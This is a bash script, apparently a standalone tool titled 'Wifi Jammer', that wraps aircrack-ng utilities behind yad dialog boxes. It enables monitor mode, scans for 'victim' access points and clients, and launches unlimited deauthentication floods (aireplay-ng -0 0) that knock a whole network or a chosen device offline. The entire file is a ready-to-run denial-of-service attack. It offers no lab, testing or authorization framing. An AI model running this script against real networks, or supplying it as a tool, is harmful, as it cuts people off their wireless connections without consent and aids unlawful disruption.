
#!/bin/bash

echo "---------------"
echo "- Wifi Jammer -"
echo "---------------"
echo " "
airmon-ng
echo "starting monitor mode: "
echo " "
airmon-ng start wlan0
airmon-ng check kill
echo "---------------"
echo "- Wifi Jammer -"
echo "---------------"
echo " "
echo " Search for Broadcast stations (y/n): "
echo " "
yad --center --width=300 --height=100 --title "Alert" --image "dialog-question" --buttons-layout=center --text "Search for Broadcasting Access Points ?" \
--button=gtk-yes:0 --button=gtk-no:1
val=$?
if [[ $val == 0 ]]; then
echo "Searching for Victims: "
echo " "
echo "Hit ctrl+C to stop the scan "
echo " "
sleep 5
airodump-ng wlan0mon
echo "---------------"
echo "- Wifi Jammer -"
echo "---------------"
echo " "
echo " Enter the BSSID of the Victim AP: "
echo " "
BSSID=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Enter The BSSID of the Victim AP: " --entry )
until [[ $BSSID == [[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]  ]]
do
BSSID=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a valid BSSID From the list : " --entry )
done
echo " Enter the Channel of the BSSID: "
echo " "
channel=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Enter the Channel of the Victim AP: " --entry )
until [ "$channel" == 1 ] || [ "$channel" == 2 ] || [ "$channel" == 3 ] || [ "$channel" == 4 ] || [ "$channel" == 5 ] || [ "$channel" == 6 ] || [ "$channel" == 7 ] || [ "$channel" == 8 ] || [ "$channel" == 9 ] || [ "$channel" == 10 ] || [ "$channel" == 11 ]
do
channel=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a number between 1 - 11 : " --entry )
done
echo "Hit Ctrl+C to stop the scan"
echo " "
sleep 5
airodump-ng -c "$channel" --bssid "$BSSID" wlan0mon
echo "---------------"
echo "- Wifi Jammer -"
echo "---------------"
echo " "
yad --center --width=300 --height=100 --title "Alert" --image "dialog-question" --buttons-layout=center --text "Block the Entire Wifi Access on the BSSID $BSSID ?" \
--button=gtk-yes:0 --button=gtk-no:1
ans=$?
if [[ $ans == 0 ]]; then
echo " Blocking all traffic on BSSID $BSSID : "
echo " "
echo " Hit Ctrl+c to stop the attack. "
echo " "
aireplay-ng -0 0 -a  "$BSSID" wlan0mon
elif [[ $ans == 1 ]]; then
echo " Enter the Station to block : "
echo  " "
node=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Enter The Station to Block: " --entry )
until [[ $node == [[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]  ]]
do
node=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a valid Mac Addr : " --entry )
done
echo " Hit Ctrl+c to stop the attack. "
echo " "
aireplay-ng -0 0 -a "$BSSID" -c "$node" wlan0mon
fi
elif [[ $val == 1 ]]; then
echo " Enter the MAC address manually or Quit (y/n): "
echo " "
yad --center --width=300 --height=100 --title "Alert" --image "dialog-question" --buttons-layout=center --text "Enter The MAC Addr (yes) or Exit (no): " \
--button=gtk-yes:0 --button=gtk-no:1
mma=$?
if [[ $mma == 0 ]]; then
echo " Enter the MAC Address of the victim: "
echo " "
bssid1=$(yad --center --width=300 --title "Alert" --buttons-layout=center --text="Enter The MAC Addr of the Station to Block: " --entry )
until [[ $bssid1 == [[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]  ]]
do
bssid1=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a valid Mac Addr : " --entry )
done
echo " Block all traffic on the victim $bssid1 or a particular station (a/c) : "
echo " "
yad --center --width=300 --height=100 --title "Alert" --image "dialog-question" --buttons-layout=center --text "Block All Traffic on The Victim $bssid1 or a Particular Station ? " \
--button=All:0 --button=Choose:1
req=$?
if [[ $req == 0 ]]; then
yad --center --width=300 --height=100 --title "Alert" --image "dialog-question" --buttons-layout=center --text " Enter the Channel of $bssid1 or Search for it ? " \
--button=Enter:0 --button=Search:1
req1=$?
if [[ $req1 == 0 ]]; then
ch1=$(yad --center --width=300 --title "Alert" --buttons-layout=center --text="Enter The channel of the station: " --entry )
until [ "$ch1" == 1 ] || [ "$ch1" == 2 ] || [ "$ch1" == 3 ] || [ "$ch1" == 4 ] || [ "$ch1" == 5 ] || [ "$ch1" == 6 ] || [ "$ch1" == 7 ] || [ "$ch1" == 8 ] || [ "$ch1" == 9 ] || [ "$ch1" == 10 ] || [ "$ch1" == 11 ]
do
ch1=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a number between 1 - 11 : " --entry )
done
elif [[ $req1 == 1 ]]; then
echo "Scanning wifi to retrieve the channel info: (hit Ctrl+z to exit the scan anytime) "
airodump-ng wlan0mon
echo " "
ch1=$(yad --center --width=300 --title "Alert" --buttons-layout=center --text="Enter The channel of the station: " --entry )
until [ "$ch1" == 1 ] || [ "$ch1" == 2 ] || [ "$ch1" == 3 ] || [ "$ch1" == 4 ] || [ "$ch1" == 5 ] || [ "$ch1" == 6 ] || [ "$ch1" == 7 ] || [ "$ch1" == 8 ] || [ "$ch1" == 9 ] || [ "$ch1" == 10 ] || [ "$ch1" == 11 ]
do
ch1=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a number between 1 - 11 : " --entry )
done
echo " "
fi
echo "Setting the channel to $bssid1 (hit Ctrl+z to exit the scan anytime: "
echo " "
sleep 2
airodump-ng -c "$ch1" --bssid "$bssid1" wlan0mon
echo " Blocking all traffic on the Access point $bssid1 : "
echo " "
sleep 2
aireplay-ng -0 0 -a "$bssid1" wlan0mon
elif [[ $req == 1 ]]; then
echo " Do you know the MAC addr of the Victim Station or do you want to search for it (k/s): "
echo " "
yad --center --width=300 --height=100 --title "Alert" --image "dialog-question" --buttons-layout=center --text "Do you know the MAC addr of the Victim Station or do you want to search for it ? " \
--button=Know:0 --button=Search:1
opt=$?
if [[ $opt == 0 ]]; then
echo " Enter the MAC addr of the Victim Station: "
echo " "
nod=$(yad --center --width=300 --title "Alert" --buttons-layout=center --text="Enter The MAC Addr of the Victim Station to Block: " --entry )
until [[ $nod == [[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]  ]]
do
nod=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a valid Mac Addr : " --entry )
done
echo "Setting up the channel: "
echo " "
yad --center --width=300 --height=100 --title "Alert" --image "dialog-question" --buttons-layout=center --text " Enter the Channel of $bssid1 or Search for it ? " \
--button=Enter:0 --button=Search:1
req1=$?
if [[ $req1 == 0 ]]; then
ch1=$(yad --center --width=300 --title "Alert" --buttons-layout=center --text="Enter The channel of the station: " --entry )
until [ "$ch1" == 1 ] || [ "$ch1" == 2 ] || [ "$ch1" == 3 ] || [ "$ch1" == 4 ] || [ "$ch1" == 5 ] || [ "$ch1" == 6 ] || [ "$ch1" == 7 ] || [ "$ch1" == 8 ] || [ "$ch1" == 9 ] || [ "$ch1" == 10 ] || [ "$ch1" == 11 ]
do
ch1=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a number between 1 - 11 : " --entry )
done
elif [[ $req1 == 1 ]]; then
echo "Scanning wifi to retrieve the channel info: (hit Ctrl+z to exit the scan anytime) "
airodump-ng wlan0mon
echo " "
echo " Enter the Channel on which the $bssid1 is broadcasting: "
ch1=$(yad --center --width=300 --title "Alert" --buttons-layout=center --text="Enter The channel of the station: " --entry )
until [ "$ch1" == 1 ] || [ "$ch1" == 2 ] || [ "$ch1" == 3 ] || [ "$ch1" == 4 ] || [ "$ch1" == 5 ] || [ "$ch1" == 6 ] || [ "$ch1" == 7 ] || [ "$ch1" == 8 ] || [ "$ch1" == 9 ] || [ "$ch1" == 10 ] || [ "$ch1" == 11 ]
do
ch1=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a number between 1 - 11 : " --entry )
done
echo " "
fi
airodump-ng  -c "$ch1" --bssid "$bssid1" wlan0mon
echo " Blocking all Station $nod on the $bssid1 Station: "
echo " "
echo " Press Ctrl + c to exit "
echo " "
aireplay-ng -0 0 -a "$bssid1" -c "$nod" wlan0mon
elif [[ $opt == 1 ]]; then
echo "Searching for the Connected Stations on the $bssid1 network (let the scan run for a few minutes to get all the stations) : "
echo " "
echo " Press Ctrl + c to stop "
echo " "
sleep 5
airodump-ng --bssid "$bssid1" wlan0mon
echo " Enter the channel of the victim network :"
echo " "
ch=$(yad --center --width=300 --title "Alert" --buttons-layout=center --text="Enter The Channel of the Station to Block: " --entry )
until [ "$ch" == 1 ] || [ "$ch" == 2 ] || [ "$ch" == 3 ] || [ "$ch" == 4 ] || [ "$ch" == 5 ] || [ "$ch" == 6 ] || [ "$ch" == 7 ] || [ "$ch" == 8 ] || [ "$ch" == 9 ] || [ "$ch" == 10 ] || [ "$ch" == 11 ]
do
ch=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a number between 1 - 11 : " --entry )
done
echo "Setting Up the channel: "
echo " "
echo " Press Ctrl + c to stop "
sleep 3
airodump-ng -c "$ch" --bssid "$bssid1" wlan0mon
echo " Enter the MAC addr of the victim station from above: "
echo " "
ma=$(yad --center --width=300 --title "Alert" --buttons-layout=center --text="Enter The MAC Addr of the Victim Station from the Terminal Window : " --entry )
until [[ $ma == [[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]:[[:xdigit:]][[:xdigit:]]  ]]
do
ma=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Invalid Value Entered, Please Enter a valid Mac Addr : " --entry )
done
echo " Enter the ESSID of the above station: "
echo " "
echo " Blocking $ma from the $bssid1 network: "
echo " "
echo " Press Ctrl + c to Stop "
aireplay-ng -0 0 -a "$bssid1" -c "$ma"  wlan0mon
fi
fi
fi
elif [[ $mma == 1 ]]; then
airmon-ng stop wlan0mon
fi
exit
